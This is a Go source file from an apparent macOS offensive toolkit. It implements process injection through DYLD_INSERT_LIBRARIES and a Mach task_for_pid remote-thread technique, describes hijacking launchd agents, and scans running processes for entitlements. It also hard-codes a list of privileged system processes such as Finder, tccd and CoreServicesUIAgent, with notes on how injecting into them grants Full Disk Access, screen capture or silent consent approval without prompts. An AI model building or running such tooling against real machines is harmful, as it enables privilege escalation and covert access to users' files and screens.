// Package inject implements macOS process injection primitives.
//
// Three injection strategies are provided, in ascending order of privilege:
//
//  1. DylibEnv — re-launch a new process with DYLD_INSERT_LIBRARIES set.
//     Works only for processes you spawn; blocked by Hardened Runtime unless
//     the target has com.apple.security.cs.allow-dyld-environment-variables.
//
//  2. DylibMach — inject a dylib into an already-running process via
//     task_for_pid + mach_vm_write + thread_create_running.
//     Requires either: SIP task_for_pid flag (CSRAllowTaskForPID = 0x0004)
//     OR the injecting process has com.apple.security.cs.debugger entitlement.
//
//  3. AgentSwap — replace the binary of a privileged launchd agent/daemon,
//     reload it, and let it run under the original agent's TCC grants.
//     Requires SIP unrestricted-fs if the target is under /System/Library.
//     See the agent/ package for the full hijack workflow.
//
// Usage:
//
//	import "mackit/inject"
//
//	targets := inject.KnownTargets()                  // hardcoded TCC-rich procs
//	targets, err := inject.FindPermissioned("ScreenCapture")
//	err = inject.DylibMach(pid, "/tmp/payload.dylib")
//	err = inject.DylibEnv("/bin/sh", []string{"-c","id"}, "/tmp/payload.dylib")
package inject

import (
	"fmt"
	"os/exec"
	"strconv"
	"strings"
)

// ─── Known privileged targets ─────────────────────────────────────────────────

// Target describes a macOS process that is known to hold TCC permissions and
// therefore makes a useful injection target.
type Target struct {
	// Name is the process name as it appears in ps / Activity Monitor.
	Name string
	// BundleID is the CFBundleIdentifier or launchd label of the service.
	BundleID string
	// Path is the typical executable path.
	Path string
	// Services lists the TCC service keys this process is known to possess.
	Services []string
	// Notes explains why this process is interesting / how it is used in PoCs.
	Notes string
}

// KnownTargets returns a curated list of macOS system processes that carry
// TCC permissions useful for privilege escalation or data access.
//
// This list is based on published PoC research and Apple security advisories.
// It is NOT exhaustive — use FindPermissioned for runtime discovery.
func KnownTargets() []Target {
	return []Target{
		{
			Name:     "Finder",
			BundleID: "com.apple.finder",
			Path:     "/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder",
			Services: []string{
				"kTCCServiceAccessibility",
				"kTCCServiceScreenCapture",
				"kTCCServiceSystemPolicyAllFiles",
				"kTCCServiceSystemPolicyDesktopFolder",
				"kTCCServiceSystemPolicyDocumentsFolder",
			},
			Notes: "Always running as the console user. Injecting gives Full Disk + Screen Capture " +
				"without any TCC prompt. CVE-2024-44131 (fileproviderd) uses Finder as the trigger.",
		},
		{
			Name:     "Dock",
			BundleID: "com.apple.dock",
			Path:     "/System/Library/CoreServices/Dock.app/Contents/MacOS/Dock",
			Services: []string{
				"kTCCServiceAccessibility",
				"kTCCServiceScreenCapture",
			},
			Notes: "Always running as the console user. Screen recording + Accessibility without prompts.",
		},
		{
			Name:     "SystemUIServer",
			BundleID: "com.apple.systemuiserver",
			Path:     "/System/Library/CoreServices/SystemUIServer.app/Contents/MacOS/SystemUIServer",
			Services: []string{
				"kTCCServiceScreenCapture",
				"kTCCServiceAccessibility",
			},
			Notes: "Controls the menu bar. Holds ScreenCapture; has been used in screen-grab bypasses.",
		},
		{
			Name:     "CoreServicesUIAgent",
			BundleID: "com.apple.coreservices.uiagent",
			Path:     "/System/Library/CoreServices/CoreServicesUIAgent.app/Contents/MacOS/CoreServicesUIAgent",
			Services: []string{
				"kTCCServiceSystemPolicyAllFiles",
				"kTCCServiceAccessibility",
			},
			Notes: "Handles permission consent dialogs on behalf of the system. Replacing this binary " +
				"lets attacker silently approve TCC requests or suppress them. " +
				"Requires SIP unrestricted-fs to swap the binary.",
		},
		{
			Name:     "tccd",
			BundleID: "com.apple.tccd",
			Path:     "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd",
			Services: []string{
				"kTCCServiceSystemPolicyAllFiles",
				"kTCCServiceAccessibility",
				"kTCCServiceScreenCapture",
			},
			Notes: "The TCC daemon itself. Injecting here gives unrestricted access to TCC.db. " +
				"Has been abused in several CVEs (e.g. CVE-2021-30713). Requires task_for_pid.",
		},
		{
			Name:     "fileproviderd",
			BundleID: "com.apple.fileproviderd",
			Path:     "/System/Library/PrivateFrameworks/FileProvider.framework/Support/fileproviderd",
			Services: []string{
				"kTCCServiceSystemPolicyAllFiles",
			},
			Notes: "Full Disk Access without user prompt. CVE-2024-44131 targets this process " +
				"via a symlink-following race during Finder copy operations.",
		},
		{
			Name:     "VoiceOverSystem",
			BundleID: "com.apple.voiceover",
			Path:     "/System/Library/CoreServices/VoiceOver.app/Contents/MacOS/VoiceOverSystem",
			Services: []string{
				"kTCCServiceSystemPolicyAllFiles",
				"kTCCServiceAccessibility",
			},
			Notes: "Full Disk Access for file description. CVE-2025-43530 abuses the AX " +
				"kAXURLAttribute pipeline to exfil arbitrary files via VoiceOver.",
		},
		{
			Name:     "com.apple.MobileAsset.AssetCacheLocator",
			BundleID: "com.apple.assetsd",
			Path:     "/usr/libexec/assetsd",
			Services: []string{
				"kTCCServiceSystemPolicyAllFiles",
			},
			Notes: "assetsd runs as root with Full Disk Access. Historic launchctl trick: " +
				"bootstrap assetsd with a custom plist to gain FDA without prompts.",
		},
		{
			Name:     "lsd",
			BundleID: "com.apple.lsd",
			Path:     "/usr/libexec/lsd",
			Services: []string{
				"kTCCServiceSystemPolicyAllFiles",
			},
			Notes: "Launch Services daemon. Runs as root. Used in CVE-2022-26767 and " +
				"related quarantine-bypass chains.",
		},
	}
}

// ─── FindPermissioned ─────────────────────────────────────────────────────────

// FindPermissioned returns running processes whose codesign entitlements
// include the given TCC service key (e.g. "kTCCServiceScreenCapture").
//
// This is a runtime discovery complementing KnownTargets.  It shells out to
// ps + codesign — slow but dependency-free.
func FindPermissioned(tccServiceKey string) ([]Target, error) {
	out, err := exec.Command("ps", "axo", "pid,comm").Output()
	if err != nil {
		return nil, fmt.Errorf("ps: %w", err)
	}

	var results []Target
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "PID") {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}
		pid, err := strconv.Atoi(fields[0])
		if err != nil || pid == 0 {
			continue
		}
		path := strings.Join(fields[1:], " ")

		// Check entitlements via codesign
		ents, err := entitlementsForPID(pid)
		if err != nil {
			continue
		}
		if strings.Contains(ents, tccServiceKey) {
			results = append(results, Target{
				Name:     path,
				Path:     path,
				Services: []string{tccServiceKey},
				Notes:    fmt.Sprintf("runtime discovery — pid %d", pid),
			})
		}
	}
	return results, nil
}

// ─── DylibEnv ─────────────────────────────────────────────────────────────────

// DylibEnv launches cmd with args, with dylibPath prepended to
// DYLD_INSERT_LIBRARIES.  Useful for injecting into processes you spawn
// (e.g. a helper tool or a re-executed copy of the current binary).
//
// Blocked by Hardened Runtime unless the target binary opts in with
// com.apple.security.cs.allow-dyld-environment-variables.
func DylibEnv(cmd string, args []string, dylibPath string) error {
	c := exec.Command(cmd, args...)
	c.Env = append(c.Environ(), "DYLD_INSERT_LIBRARIES="+dylibPath)
	if out, err := c.CombinedOutput(); err != nil {
		return fmt.Errorf("DylibEnv: %w — %s", err, strings.TrimSpace(string(out)))
	}
	return nil
}

// DylibMach injects dylibPath into the process identified by pid using the
// Mach task_for_pid + remote thread technique.
//
// Pre-conditions (checked automatically, returns descriptive errors):
//   - SIP CSRAllowTaskForPID flag must be set, OR the calling binary must hold
//     the com.apple.security.cs.debugger entitlement.
//   - Calling process must be running as root (or the same UID as the target).
//   - dylibPath must exist and be a valid Mach-O dylib for the target arch.
//
// The remote thread calls dlopen(dylibPath, RTLD_NOW|RTLD_GLOBAL) in the
// target process.  The thread crashes on return (lr=0) — this is intentional;
// the dylib's constructor runs normally before the crash.
func DylibMach(pid int, dylibPath string) error {
	return machInjectDylib(pid, dylibPath)
}

// ─── helpers ─────────────────────────────────────────────────────────────────

func entitlementsForPID(pid int) (string, error) {
	// Resolve exe path from pid via ps, then codesign on the path
	out, err := exec.Command("ps", "-p", strconv.Itoa(pid), "-o", "comm=").Output()
	if err != nil {
		return "", err
	}
	path := strings.TrimSpace(string(out))
	if path == "" {
		return "", fmt.Errorf("no path for pid %d", pid)
	}
	ents, err := exec.Command(
		"codesign", "--display", "--entitlements", "-", "--xml", path,
	).Output()
	if err != nil {
		return "", err
	}
	return string(ents), nil
}
